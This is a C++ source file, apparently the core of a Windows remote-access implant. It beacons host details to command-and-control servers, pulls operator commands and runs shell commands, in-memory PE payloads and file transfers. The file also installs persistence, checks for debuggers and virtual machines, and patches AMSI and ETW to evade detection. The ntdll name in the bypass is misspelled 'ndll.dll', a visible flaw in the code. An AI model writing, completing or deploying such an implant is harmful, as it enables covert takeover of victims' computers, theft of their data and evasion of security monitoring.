#include <windows.h>
#include <thread>
#include <chrono>
#include <sstream>
#include "config.h"
#include "system_utils.h"
#include "base64.h"
#include "crypt.h"
#include "http_client.h"
#include "task.h"
#include "pe-exec.h"
#include "file_utils.h"
#include "persistence.h"
#include "debug_detection.h"
#include "bypass_amsi_etw.h"
// [B21] Inclure le header de sleep obfuscation
#include "sleep_obfuscation.h"

using namespace std;

#ifdef ANTI_VM_ENABLED
extern "C" bool is_virtual_machine();
#endif

void parse_command_type(const string& command, string& types, string& value) {
    size_t sep1 = command.find('\'');
    if (sep1 == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    size_t sep2 = command.find('\'', sep1 + 1);
    if (sep2 == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    types = command.substr(sep1 + 1, sep2 - sep1 - 1);

    size_t colon = command.find(':', sep2);
    if (colon == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    size_t sep3 = command.find('\'', colon);
    if (sep3 == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    size_t sep4 = command.find('\'', sep3 + 1);
    if (sep4 == string::npos) {
        value = command.substr(sep3 + 1);
        size_t end = value.find_last_not_of(" \t\r\n'");
        if (end != string::npos) {
            value = value.substr(0, end + 1);
        }
    } else {
        value = command.substr(sep3 + 1, sep4 - sep3 - 1);
    }
}

string extract_filename(const string& command_type, const string& command_value) {
    if (command_type != "download") {
        return "";
    }

    return command_value;
}

string send_beacon(const string& agent_id, const string& results_data = "") {
    string hostname = get_hostname();
    string username = get_username();
    string process_name = get_process_name();
    string ip_pub = getPublicIP();
    ostringstream ss;
    ss << "{";
    ss << "\"agent_id\":\"" << agent_id << "\",";
    ss << "\"hostname\":\"" << hostname << "\",";
    ss << "\"username\":\"" << username << "\",";
    ss << "\"process_name\":\"" << process_name << "\",";
    ss << "\"ip_address\":\"" << ip_pub << "\",";
    ss << "\"results\":\"" << results_data << "\"";
    ss << "}";

    string beacon_json = ss.str();

    string xor_encrypted = xor_data(beacon_json, XOR_KEY);

    string b64_encoded = base64_encode(xor_encrypted);

    string response = http_post(
        XOR_SERVERS,
        XOR_PORT,
        RESULTS_PATH,
        USER_AGENT,
        HEADER,
        b64_encoded,
        USE_HTTPS
    );

    return response;
}

vector<pair<int64_t, string>> fetch_commands(const string& agent_id) {
    vector<pair<int64_t, string>> commands;

    ostringstream ss;
    ss << "{\"agent_id\":\"" << agent_id << "\"}";
    string request_json = ss.str();

    string xor_encrypted = xor_data(request_json, XOR_KEY);

    string b64_encoded = base64_encode(xor_encrypted);

    string response = http_post(
        XOR_SERVERS,
        XOR_PORT,
        COMMAND_PATH,
        USER_AGENT,
        HEADER,
        b64_encoded,
        USE_HTTPS
    );

    if (response.empty()) {
        return commands;
    }

    string xor_response = base64_decode(response);

    string clear_response = xor_data(xor_response, XOR_KEY);

    size_t commands_pos = clear_response.find("\"commands\":[");
    if (commands_pos == string::npos) {
        return commands;
    }

    size_t pos = commands_pos + 12;

    while (pos < clear_response.length()) {
        while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t' || clear_response[pos] == '\n')) pos++;

        if (pos >= clear_response.length() || clear_response[pos] == ']') break;

        if (clear_response[pos] == ',') {
            pos++;
            continue;
        }

        if (clear_response[pos] == '{') {
            pos++;

            int64_t cmd_id = -1;
            string cmd_text = "";

            while (pos < clear_response.length() && clear_response[pos] != '}') {
                while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t')) pos++;

                if (clear_response[pos] == ',') {
                    pos++;
                    continue;
                }

                if (clear_response.substr(pos, 5) == "\"id\":") {
                    pos += 5;
                    while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t')) pos++;

                    size_t end = pos;
                    while (end < clear_response.length() && isdigit(clear_response[end])) end++;
                    cmd_id = atoll(clear_response.substr(pos, end - pos).c_str());
                    pos = end;
                }
                else if (clear_response.substr(pos, 11) == "\"command\":\"") {
                    pos += 11;
                    size_t end = pos;
                    while (end < clear_response.length()) {
                        if (clear_response[end] == '\\') {
                            end += 2;
                            continue;
                        }
                        if (clear_response[end] == '"') break;
                        end++;
                    }
                    cmd_text = clear_response.substr(pos, end - pos);
                    pos = end + 1;
                } else {
                    pos++;
                }
            }

            if (cmd_id != -1 && !cmd_text.empty()) {
                commands.push_back(make_pair(cmd_id, cmd_text));
            }

            pos++;
        } else {
            pos++;
        }
    }

    return commands;
}

string fetch_pe_data(int64_t command_id) {
    ostringstream path_stream;
    path_stream << PE_DATA_PATH << "/" << command_id;
    string path = path_stream.str();

    string response = http_get(
        XOR_SERVERS,
        XOR_PORT,
        path,
        USER_AGENT,
        HEADER,
        USE_HTTPS
    );

    if (response.empty()) {
        return "";
    }

    string xor_encrypted;
    try {
        xor_encrypted = base64_decode(response);
    } catch (const exception& e) {
        return "";
    }

    string decrypted = xor_data(xor_encrypted, XOR_KEY);

    return decrypted;
}

bool submit_result(const string& agent_id, int64_t command_id, const string& output, bool success, const string& types, const string& filename = "") {
    string output_b64 = base64_encode(output);

    ostringstream ss;
    ss << "{";
    ss << "\"agent_id\":\"" << agent_id << "\",";
    ss << "\"command_id\":" << command_id << ",";
    ss << "\"output\":\"" << output_b64 << "\",";
    ss << "\"success\":" << (success ? "true" : "false") << ",";
    ss << "\"types\":\"" << types << "\"";

    if (!filename.empty()) {
        ss << ",\"filename\":\"" << filename << "\"";
    }

    ss << "}";
    string result_json = ss.str();

    string xor_encrypted = xor_data(result_json, XOR_KEY);

    string b64_encoded = base64_encode(xor_encrypted);

    string response = http_post(
        XOR_SERVERS,
        XOR_PORT,
        RESULT_PATH,
        USER_AGENT,
        HEADER,
        b64_encoded,
        USE_HTTPS
    );

    if (response.empty()) {
        return false;
    }

    return true;
}

void agent_run() {

    // [B21] Initialiser le système de sleep obfuscation
    #ifdef USE_SLEEP_OBFUSCATION

    if (b21::initialize_sleep_obfuscation()) {
    } else {
    }
    #endif

    if (!is_persistence_installed()) {

        if (install_persistence()) {
        } else {
        }
    } else {
    }

    string agent_id = generate_agent_id();

    string initial_response = send_beacon(agent_id, "");

    if (initial_response.empty()) {
    } else {
    }

    while (true) {
        // [B21] Utiliser le sleep obfusqué au lieu de std::this_thread::sleep_for
        #ifdef USE_SLEEP_OBFUSCATION
        DWORD sleep_ms = BEACON_INTERVAL * 1000;

        if (!b21::obfuscated_sleep_with_jitter(sleep_ms, SLEEP_JITTER_PERCENT)) {
            // Fallback vers sleep standard si échec
            std::this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));
        }
        #else
        std::this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));
        #endif

        string beacon_response = send_beacon(agent_id, "");

        if (beacon_response.empty()) {
            continue;
        }

        vector<pair<int64_t, string>> commands = fetch_commands(agent_id);
        if (commands.empty()) {
            continue;
        }

        for (size_t i = 0; i < commands.size(); i++) {
            int64_t cmd_id = commands[i].first;
            string cmd_text = commands[i].second;

            string cmd_type, cmd_value;
            parse_command_type(cmd_text, cmd_type, cmd_value);

            string result;
            string result_type;
            bool success = true;

            if (cmd_type == "pe-exec") {

                string pe_data_json = fetch_pe_data(cmd_id);

                if (pe_data_json.empty()) {
                    result = "Error: Failed to fetch PE data from server";
                    result_type = "text";
                    success = false;

                } else {

                    try {
                        result = handle_pe_exec(pe_data_json);
                        result_type = "text";

                        if (result.empty()) {
                            result = "Error: PE execution returned no output";
                            success = false;
                        } else if (result.find("Error:") != string::npos) {
                            success = false;
                        } else {
                            success = true;
                        }
                    } catch (const exception& e) {
                        result = string("Error: Exception during PE execution: ") + e.what();
                        result_type = "text";
                        success = false;

                    }
                }
            }
            else if (cmd_type == "cmd") {

                result = exec_cmd(cmd_value);
                result_type = "text";

            }
            else if (cmd_type == "download") {

                result = handle_download(cmd_value);
                result_type = "file";

                if (result.find("Error:") != string::npos) {
                    success = false;
                } else {
                }
            }
            else if (cmd_type == "upload") {

                result = handle_upload(cmd_value);
                result_type = "text";

                if (result.find("Error:") != string::npos || result.find("Failed") != string::npos) {
                    success = false;
                } else {
                }
            }
            else {
                result = "Error: Unknown command type: " + cmd_type;
                result_type = "text";
                success = false;

            }

            bool submitted = submit_result(agent_id, cmd_id, result, success, result_type);

            if (submitted) {
            } else {
            }
        }

    }
}

int main() {
    #ifdef ANTI_DEBUG_ENABLED
    anti_debug_basic();
    #endif

    #ifdef ANTI_VM_ENABLED
    if (is_virtual_machine()) {
        return 1;
    }
    #endif

    #ifdef BYPASS_AMSI_ETW_ENABLED
    {
        WCHAR wAmsi[]  = { L'a',L'm',L's',L'i',L'.',L'd',L'l',L'l',L'\0' };
        WCHAR wNtdll[] = { L'n',L'd',L'l',L'l',L'.',L'd',L'l',L'l',L'\0' };
        CHAR  cFunc[]  = { 'A','m','s','i','S','c','a','n','B','u','f','f','e','r','\0' };
        CHAR  cEtw[]   = { 'E','t','w','E','v','e','n','t','W','r','i','t','e','\0' };

        HMODULE hAmsi  = GetModuleHandleW(wAmsi);
        HMODULE hNtdll = GetModuleHandleW(wNtdll);

        if (hAmsi && hNtdll) {
            PVOID fnScan = (PVOID)GetProcAddress(hAmsi, cFunc);
            PVOID fnEtw  = (PVOID)GetProcAddress(hNtdll, cEtw);
            if (fnScan && fnEtw) {
                AddBypassTarget((PVOID)fnScan, S_OK, 6, kAmsiResultClean);
                AddBypassTarget((PVOID)fnEtw, ERROR_SUCCESS);
                InstallBypass();
            }
        }
    }
    #endif

    try {
        agent_run();
    }
    catch (const exception&) {
        #ifdef BYPASS_AMSI_ETW_ENABLED
        UninstallBypass();
        #endif
        return 1;
    }

    #ifdef BYPASS_AMSI_ETW_ENABLED
    UninstallBypass();
    #endif

    return 0;
}
